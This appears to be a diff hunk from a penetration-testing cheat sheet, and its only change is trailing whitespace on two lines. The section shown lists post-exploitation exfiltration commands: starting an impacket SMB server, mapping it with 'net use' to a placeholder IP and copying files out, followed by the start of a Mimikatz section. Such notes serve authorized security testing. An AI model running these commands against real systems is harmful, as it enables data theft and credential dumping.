@@ -127,8 +127,8 @@ ____
  ____ 
  # Post Exploitation / Exfiltration 
  [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)  
-     python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS 
-     net use \\IP\share /USER:USER PASS 
+     python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS  
+     net use \\IP\share /USER:USER PASS  
      copy FILE \\IP\share\FILE  
  ## Mimikatz
      privilege::debug 
